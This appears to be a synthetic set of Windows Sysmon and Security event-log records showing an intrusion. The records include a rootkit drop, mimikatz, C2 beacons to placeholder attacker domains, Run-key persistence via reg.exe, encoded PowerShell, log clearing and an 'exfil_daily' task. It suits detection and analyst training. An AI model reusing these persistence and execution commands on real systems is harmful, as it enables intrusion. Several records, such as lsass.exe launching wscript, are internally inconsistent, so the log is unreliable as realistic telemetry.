<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>11</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:51:38.0000000Z" /><EventRecordID>2022</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T18:51:38.0000000Z</Data><Data Name="ProcessId">11789</Data><Data Name="Image">C:\Windows\System32\cmd.exe</Data><Data Name="TargetFilename">C:\Windows\System32\drivers\rootkit.sys</Data><Data Name="CreationUtcTime">2024-11-25T18:51:38.0000000Z</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>8</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:51:39.0000000Z" /><EventRecordID>2023</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKSTN-CHARLIE</Computer></System><EventData><Data Name="UtcTime">2024-11-25T18:51:39.0000000Z</Data><Data Name="SourceProcessId">3169</Data><Data Name="SourceImage">C:\Windows\System32\regsvr32.exe</Data><Data Name="TargetProcessId">51166</Data><Data Name="TargetImage">C:\Windows\SysWOW64\rundll32.exe</Data><Data Name="NewThreadId">288</Data><Data Name="StartAddress">0x7ff0c7b13265</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>13</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:51:42.0000000Z" /><EventRecordID>2024</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>DC01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T18:51:42.0000000Z</Data><Data Name="EventType">SetValue</Data><Data Name="ProcessId">22135</Data><Data Name="Image">C:\Windows\System32\regsvr32.exe</Data><Data Name="TargetObject">HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Update</Data><Data Name="Details">powershell.exe -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>12</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:52:05.0000000Z" /><EventRecordID>2025</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>LAPTOP-MGMT</Computer></System><EventData><Data Name="UtcTime">2024-11-25T18:52:05.0000000Z</Data><Data Name="EventType">CreateKey</Data><Data Name="ProcessId">32508</Data><Data Name="Image">C:\Windows\System32\cmd.exe</Data><Data Name="TargetObject">HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Update</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>22</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:52:34.0000000Z" /><EventRecordID>2026</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>DC02</Computer></System><EventData><Data Name="UtcTime">2024-11-25T18:52:34.0000000Z</Data><Data Name="ProcessId">36325</Data><Data Name="Image">C:\Tools\mimikatz.exe</Data><Data Name="QueryName">au.download.windowsupdate.com</Data><Data Name="QueryStatus">0</Data><Data Name="QueryResults">198.51.100.23</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:52:45.0000000Z" /><EventRecordID>2027</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>LAPTOP-MGMT</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-7210-2886-9257-1001</Data><Data Name="TargetUserName">alice</Data><Data Name="TargetDomainName">CONTOSO</Data><Data Name="LogonType">10</Data><Data Name="IpAddress">198.51.100.23</Data><Data Name="IpPort">20020</Data><Data Name="ProcessName">C:\Windows\SysWOW64\rundll32.exe</Data><Data Name="WorkstationName">LAPTOP-MGMT</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4672</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:52:50.0000000Z" /><EventRecordID>2028</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC02</Computer></System><EventData><Data Name="SubjectUserName">charlie</Data><Data Name="SubjectDomainName">CONTOSO</Data><Data Name="SubjectLogonId">0xa9b06c</Data><Data Name="PrivilegeList">SeSecurityPrivilege
			SeBackupPrivilege
			SeRestorePrivilege</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>3</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:53:09.0000000Z" /><EventRecordID>2029</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>LAPTOP-MGMT</Computer></System><EventData><Data Name="UtcTime">2024-11-25T18:53:09.0000000Z</Data><Data Name="Image">C:\Windows\System32\lsass.exe</Data><Data Name="User">NT AUTHORITY\jane.smith</Data><Data Name="Protocol">tcp</Data><Data Name="SourceIp">10.0.1.12</Data><Data Name="SourcePort">10892</Data><Data Name="DestinationIp">172.16.5.10</Data><Data Name="DestinationPort">443</Data><Data Name="DestinationHostname">au.download.windowsupdate.com</Data><Data Name="Initiated">true</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>12</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:53:20.0000000Z" /><EventRecordID>2030</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKSTN-CHARLIE</Computer></System><EventData><Data Name="UtcTime">2024-11-25T18:53:20.0000000Z</Data><Data Name="EventType">DeleteKey</Data><Data Name="ProcessId">31728</Data><Data Name="Image">C:\Windows\System32\lsass.exe</Data><Data Name="TargetObject">HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Update</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:53:22.0000000Z" /><EventRecordID>2031</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-1800-1045-5280-1001</Data><Data Name="TargetUserName">SYSTEM</Data><Data Name="TargetDomainName">NT AUTHORITY</Data><Data Name="LogonType">2</Data><Data Name="IpAddress">10.0.0.5</Data><Data Name="IpPort">25789</Data><Data Name="ProcessName">C:\Windows\System32\svchost.exe</Data><Data Name="WorkstationName">JUMPHOST01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>3</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:54:09.0000000Z" /><EventRecordID>2032</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>SRV-FILE01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T18:54:09.0000000Z</Data><Data Name="Image">C:\Windows\System32\cmd.exe</Data><Data Name="User">.\jane.smith</Data><Data Name="Protocol">tcp</Data><Data Name="SourceIp">10.0.2.99</Data><Data Name="SourcePort">27578</Data><Data Name="DestinationIp">198.51.100.23</Data><Data Name="DestinationPort">8080</Data><Data Name="DestinationHostname">beacon.attacker.top</Data><Data Name="Initiated">true</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:54:26.0000000Z" /><EventRecordID>2033</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-BOB</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-4733-6269-7054-1001</Data><Data Name="TargetUserName">SYSTEM</Data><Data Name="TargetDomainName">CONTOSO</Data><Data Name="LogonType">10</Data><Data Name="IpAddress">203.0.113.45</Data><Data Name="IpPort">4235</Data><Data Name="ProcessName">C:\Windows\System32\svchost.exe</Data><Data Name="WorkstationName">WKSTN-BOB</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:54:49.0000000Z" /><EventRecordID>2034</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="SubjectUserName">alice</Data><Data Name="SubjectDomainName">CORP</Data><Data Name="NewProcessId">0xb001</Data><Data Name="NewProcessName">C:\Windows\System32\lsass.exe</Data><Data Name="CommandLine">wscript.exe C:\Users\Public\doc.vbs</Data><Data Name="ParentProcessName">C:\Windows\System32\reg.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0x884</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:55:09.0000000Z" /><EventRecordID>2035</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-WEB01</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-8537-6817-1278-1001</Data><Data Name="TargetUserName">svc_backup</Data><Data Name="TargetDomainName">CONTOSO</Data><Data Name="LogonType">10</Data><Data Name="IpAddress">10.100.10.50</Data><Data Name="IpPort">52051</Data><Data Name="ProcessName">C:\Windows\System32\reg.exe</Data><Data Name="WorkstationName">SRV-WEB01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4625</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:55:10.0000000Z" /><EventRecordID>2036</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="SubjectUserName">-</Data><Data Name="TargetUserName">bob</Data><Data Name="TargetDomainName">CORP</Data><Data Name="LogonType">3</Data><Data Name="FailureReason">%%2313</Data><Data Name="Status">0xc000006d</Data><Data Name="SubStatus">0xc0000064</Data><Data Name="IpAddress">203.0.113.45</Data><Data Name="IpPort">61850</Data><Data Name="WorkstationName">WKSTN-ALICE</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:55:19.0000000Z" /><EventRecordID>2037</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-WEB01</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-5237-3907-9969-1001</Data><Data Name="TargetUserName">svc_sql</Data><Data Name="TargetDomainName">CORP</Data><Data Name="LogonType">3</Data><Data Name="IpAddress">10.0.0.5</Data><Data Name="IpPort">33690</Data><Data Name="ProcessName">C:\Windows\System32\mshta.exe</Data><Data Name="WorkstationName">SRV-WEB01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Service Control Manager" /><EventID>7045</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:56:31.0000000Z" /><EventRecordID>2038</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>System</Channel><Computer>WKSTN-BOB</Computer></System><EventData><Data Name="ServiceName">NTDS</Data><Data Name="ImagePath">C:\Windows\System32\mshta.exe</Data><Data Name="ServiceType">user mode service</Data><Data Name="StartType">demand start</Data><Data Name="AccountName">LocalSystem</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>3</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:56:47.0000000Z" /><EventRecordID>2039</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>DC02</Computer></System><EventData><Data Name="UtcTime">2024-11-25T18:56:47.0000000Z</Data><Data Name="Image">C:\Tools\mimikatz.exe</Data><Data Name="User">CONTOSO\bob</Data><Data Name="Protocol">tcp</Data><Data Name="SourceIp">10.0.2.99</Data><Data Name="SourcePort">46679</Data><Data Name="DestinationIp">203.0.113.45</Data><Data Name="DestinationPort">8080</Data><Data Name="DestinationHostname">beacon.attacker.top</Data><Data Name="Initiated">true</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>3</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T18:57:21.0000000Z" /><EventRecordID>2040</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKSTN-CHARLIE</Computer></System><EventData><Data Name="UtcTime">2024-11-25T18:57:21.0000000Z</Data><Data Name="Image">C:\Users\alice\AppData\Roaming\implant.exe</Data><Data Name="User">.\SYSTEM</Data><Data Name="Protocol">tcp</Data><Data Name="SourceIp">203.0.113.45</Data><Data Name="SourcePort">11417</Data><Data Name="DestinationIp">10.0.2.99</Data><Data Name="DestinationPort">80</Data><Data Name="DestinationHostname">c2.badactor.xyz</Data><Data Name="Initiated">true</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4698</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T19:01:11.0000000Z" /><EventRecordID>2041</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="SubjectUserName">jane.smith</Data><Data Name="SubjectDomainName">CONTOSO</Data><Data Name="TaskName">\CORP\Backup</Data><Data Name="TaskContent">&lt;Task&gt;&lt;Actions&gt;&lt;Exec&gt;&lt;Command&gt;powershell.exe&lt;/Command&gt;&lt;/Exec&gt;&lt;/Actions&gt;&lt;/Task&gt;</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T19:01:39.0000000Z" /><EventRecordID>2042</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-CHARLIE</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-1668-7392-5777-1001</Data><Data Name="TargetUserName">svc_sql</Data><Data Name="TargetDomainName">CORP</Data><Data Name="LogonType">10</Data><Data Name="IpAddress">172.16.5.10</Data><Data Name="IpPort">26575</Data><Data Name="ProcessName">C:\Windows\System32\wscript.exe</Data><Data Name="WorkstationName">WKSTN-CHARLIE</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T19:02:05.0000000Z" /><EventRecordID>2043</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-FILE01</Computer></System><EventData><Data Name="SubjectUserName">charlie</Data><Data Name="SubjectDomainName">CONTOSO</Data><Data Name="NewProcessId">0xc89b</Data><Data Name="NewProcessName">C:\Windows\SysWOW64\rundll32.exe</Data><Data Name="CommandLine">powershell.exe -ExecutionPolicy Bypass -File C:\temp\run.ps1</Data><Data Name="ParentProcessName">C:\Users\alice\Downloads\setup.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0xbcf</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T19:02:33.0000000Z" /><EventRecordID>2044</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-FILE01</Computer></System><EventData><Data Name="SubjectUserName">svc_sql</Data><Data Name="SubjectDomainName">CORP</Data><Data Name="NewProcessId">0xbb2d</Data><Data Name="NewProcessName">C:\Windows\System32\reg.exe</Data><Data Name="CommandLine">powershell.exe -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0</Data><Data Name="ParentProcessName">C:\Windows\System32\mshta.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0x25a</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4776</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T19:02:47.0000000Z" /><EventRecordID>2045</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-WEB01</Computer></System><EventData><Data Name="PackageName">MICROSOFT_AUTHENTICATION_PACKAGE_V1_0</Data><Data Name="TargetUserName">svc_sql</Data><Data Name="Workstation">WKSTN-CHARLIE</Data><Data Name="Status">0x0</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Eventlog" /><EventID>1102</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T19:02:52.0000000Z" /><EventRecordID>2046</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>LAPTOP-MGMT</Computer></System><EventData><Data Name="SubjectUserName">jane.smith</Data><Data Name="SubjectDomainName">CORP</Data><Data Name="SubjectLogonId">0xd5a435</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4648</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T19:03:02.0000000Z" /><EventRecordID>2047</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC02</Computer></System><EventData><Data Name="SubjectUserName">admin</Data><Data Name="SubjectDomainName">.</Data><Data Name="TargetUserName">svc_backup</Data><Data Name="TargetDomainName">CONTOSO</Data><Data Name="TargetServerName">SRV-SQL01</Data><Data Name="IpAddress">10.0.2.99</Data><Data Name="ProcessName">C:\Windows\System32\lsass.exe</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>10</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T19:03:14.0000000Z" /><EventRecordID>2048</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>DC01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T19:03:14.0000000Z</Data><Data Name="SourceProcessId">23277</Data><Data Name="SourceImage">C:\Users\alice\AppData\Roaming\implant.exe</Data><Data Name="TargetProcessId">3460</Data><Data Name="TargetImage">C:\Windows\System32\lsass.exe</Data><Data Name="GrantedAccess">0x1410</Data><Data Name="CallTrace">C:\Windows\System32\ntdll.dll+0xbfd3</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>3</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T19:03:30.0000000Z" /><EventRecordID>2049</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>DC01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T19:03:30.0000000Z</Data><Data Name="Image">C:\Windows\System32\regsvr32.exe</Data><Data Name="User">CONTOSO\svc_backup</Data><Data Name="Protocol">tcp</Data><Data Name="SourceIp">192.168.1.200</Data><Data Name="SourcePort">64576</Data><Data Name="DestinationIp">203.0.113.45</Data><Data Name="DestinationPort">53</Data><Data Name="DestinationHostname">au.download.windowsupdate.com</Data><Data Name="Initiated">true</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T19:03:59.0000000Z" /><EventRecordID>2050</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-BOB</Computer></System><EventData><Data Name="SubjectUserName">t.miller</Data><Data Name="SubjectDomainName">CORP</Data><Data Name="NewProcessId">0x750c</Data><Data Name="NewProcessName">C:\Windows\System32\reg.exe</Data><Data Name="CommandLine">reg.exe ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Update /d C:\temp\update.exe</Data><Data Name="ParentProcessName">C:\Windows\System32\svchost.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0xca7</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4648</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T19:04:15.0000000Z" /><EventRecordID>2051</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="SubjectUserName">bob</Data><Data Name="SubjectDomainName">NT AUTHORITY</Data><Data Name="TargetUserName">bob</Data><Data Name="TargetDomainName">CORP</Data><Data Name="TargetServerName">JUMPHOST01</Data><Data Name="IpAddress">10.0.1.12</Data><Data Name="ProcessName">C:\Windows\System32\cmd.exe</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>1</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T19:04:37.0000000Z" /><EventRecordID>2052</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKSTN-BOB</Computer></System><EventData><Data Name="UtcTime">2024-11-25T19:04:37.0000000Z</Data><Data Name="ProcessGuid">{08C6E-12343-960E-6C08}</Data><Data Name="ProcessId">27541</Data><Data Name="Image">C:\Windows\System32\powershell.exe</Data><Data Name="CommandLine">powershell.exe Get-Process | Export-Csv C:\temp\procs.csv</Data><Data Name="User">.\bob</Data><Data Name="ParentProcessId">3798</Data><Data Name="ParentImage">C:\Users\alice\AppData\Roaming\implant.exe</Data><Data Name="ParentCommandLine">powershell.exe -ExecutionPolicy Bypass -File C:\temp\run.ps1</Data><Data Name="Hashes">MD5=6cd6e3e15f031a68420fd5da93dde508,SHA256=ab2c2eb99bd3ab13a437caf40e327815f7970aebfcc702c0d1d9a39c8f11e8c2</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4776</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T19:04:45.0000000Z" /><EventRecordID>2053</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-SQL01</Computer></System><EventData><Data Name="PackageName">MICROSOFT_AUTHENTICATION_PACKAGE_V1_0</Data><Data Name="TargetUserName">admin</Data><Data Name="Workstation">JUMPHOST01</Data><Data Name="Status">0x0</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4698</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T19:05:00.0000000Z" /><EventRecordID>2054</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="SubjectUserName">alice</Data><Data Name="SubjectDomainName">CONTOSO</Data><Data Name="TaskName">\exfil_daily</Data><Data Name="TaskContent">&lt;Task&gt;&lt;Actions&gt;&lt;Exec&gt;&lt;Command&gt;powershell.exe&lt;/Command&gt;&lt;/Exec&gt;&lt;/Actions&gt;&lt;/Task&gt;</Data></EventData></Event>
